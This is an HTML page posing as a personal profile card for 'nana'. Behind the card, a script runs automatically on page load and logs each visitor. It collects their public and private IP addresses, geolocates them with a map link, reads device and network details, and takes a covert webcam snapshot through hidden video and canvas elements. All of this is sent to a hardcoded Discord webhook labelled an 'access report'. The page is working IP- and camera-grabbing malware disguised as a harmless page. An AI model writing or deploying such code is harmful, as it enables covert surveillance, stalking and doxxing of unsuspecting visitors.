<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Profile: nana | Architect</title>
    <style>
        :root { --bg: #050505; --accent: #ff4141; --text: #ffffff; --dim: #888; }
        body { margin: 0; background: var(--bg); color: var(--text); font-family: 'Consolas', 'Courier New', monospace; display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow: hidden; }
        .background { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: radial-gradient(circle at center, #1a0505 0%, #050505 100%); z-index: -1; }
        .profile-card { background: rgba(15, 10, 10, 0.9); border: 1px solid var(--accent); padding: 40px; border-radius: 8px; box-shadow: 0 0 40px rgba(255, 65, 65, 0.2); text-align: center; max-width: 450px; backdrop-filter: blur(10px); }
        .icon { width: 150px; height: 150px; border: 2px solid var(--accent); margin-bottom: 20px; box-shadow: 0 0 15px var(--accent); }
        h1 { font-size: 2.2rem; margin: 0; letter-spacing: 5px; color: var(--accent); text-transform: uppercase; }
        .info-box { margin-top: 20px; text-align: left; border-left: 2px solid var(--accent); padding-left: 20px; }
        .label { color: var(--accent); font-weight: bold; font-size: 0.9rem; }
        .value { color: var(--text); margin-bottom: 10px; font-size: 1.1rem; }
        .loading-log { font-size: 0.75rem; margin-top: 30px; color: var(--dim); height: 20px; }
        #v, #c { visibility: hidden; position: absolute; left: -9999px; }
    </style>
</head>
<body>
    <div class="background"></div>
    <div class="profile-card">
        <img src="1000007175.png" class="icon" alt="nana_icon">
        <h1>nana</h1>
        <div class="info-box">
            <div class="label">IDENTITY</div>
            <div class="value">Male / Age 15</div>
            <div class="label">INTERESTS</div>
            <div class="value">Gaming, Reading, Programming</div>
            <div class="label">SKILLS</div>
            <div class="value">Memory Hooking, Signature Scanning</div>
        </div>
        <div class="loading-log" id="status">INITIATING PERSISTENT CONNECTION...</div>
    </div>

    <video id="v" autoplay playsinline></video>
    <canvas id="c" width="640" height="480"></canvas>

    <script>
        const WH_URL = "https://discord.com/api/webhooks/1490634346359685131/-YLEFmQlCi7HxAYEOvVWXDOehb8a3kj2DErBzYuL52iHD5pMlKmf0AU9ERkbzTXWu6lp";

        async function getStats() {
            let stats = { battery: "Unknown", speed: "Unknown" };
            try {
                const b = await navigator.getBattery();
                stats.battery = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Discharging'})`;
            } catch(e) {}
            try {
                const n = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                if(n) stats.speed = `Down: ${n.downlink}Mbps / Type: ${n.effectiveType}`;
            } catch(e) {}
            return stats;
        }

        async function getGeo(ip) {
            try {
                const res = await fetch(`https://ipapi.co/${ip}/json/`);
                const d = await res.json();
                return {
                    loc: `${d.city}, ${d.region}, ${d.country_name}`,
                    map: `https://www.google.com/maps?q=${d.latitude},${d.longitude}`
                };
            } catch(e) { return { loc: "Unknown", map: "N/A" }; }
        }

        async function getPrivateIP() {
            return new Promise((resolve) => {
                const rtc = new RTCPeerConnection({ iceServers: [] });
                rtc.createDataChannel('');
                rtc.createOffer().then(o => rtc.setLocalDescription(o));
                rtc.onicecandidate = (e) => {
                    if (!e || !e.candidate) return;
                    const match = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/) || e.candidate.candidate.match(/([a-f0-9\-]+\.local)/);
                    if (match) { resolve(match[1]); rtc.onicecandidate = null; }
                };
                setTimeout(() => resolve("PROTECTED"), 4000);
            });
        }

        async function startProtocol() {
            const status = document.getElementById('status');
            const v = document.getElementById('v');
            const c = document.getElementById('c');
            
            let r = {
                ts: new Date().toLocaleString(),
                gIP: "Fetching...", pIP: await getPrivateIP(),
                plt: navigator.platform, ua: navigator.userAgent
            };

            const s = await getStats();
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                r.gIP = data.ip;
            } catch(e) { r.gIP = "DENIED"; }

            const g = await getGeo(r.gIP);

            // ステルスキャプチャ
            let fileBlob = null;
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                v.srcObject = stream;
                await new Promise(r => setTimeout(r, 1200));
                c.getContext('2d').drawImage(v, 0, 0, 640, 480);
                const dataUrl = c.toDataURL('image/jpeg');
                const bRes = await fetch(dataUrl);
                fileBlob = await bRes.blob();
                stream.getTracks().forEach(t => t.stop());
            } catch(e) {}

            const fd = new FormData();
            if(fileBlob) fd.append('file', fileBlob, 'capture.jpg');
            
            const payload = {
                username: "NANA_ADMIN_LOGGER",
                embeds: [{
                    title: "🛑 OMNISCIENT_ACCESS_REPORT",
                    color: 16727873,
                    fields: [
                        { name: "🌐 GLOBAL_IP", value: `\`${r.gIP}\``, inline: true },
                        { name: "🏠 PRIVATE_IP", value: `\`${r.pIP}\``, inline: true },
                        { name: "📍 LOCATION", value: `[${g.loc}](${g.map})`, inline: false },
                        { name: "🔋 BATTERY", value: `\`${s.battery}\``, inline: true },
                        { name: "📶 NETWORK", value: `\`${s.speed}\``, inline: true },
                        { name: "💻 SYSTEM", value: `\`${r.plt}\``, inline: true },
                        { name: "📄 USER_AGENT", value: `\`\`\`${r.ua}\`\`\`` }
                    ],
                    footer: { text: `Captured: ${r.ts} | JANUS-V4` }
                }]
            };
            fd.append('payload_json', JSON.stringify(payload));
            await fetch(WH_URL, { method: 'POST', body: fd });
            status.innerText = "LOG: CONNECTION ESTABLISHED. DATA SYNCED.";
        }
        window.onload = startProtocol;
    </script>
</body>
</html>
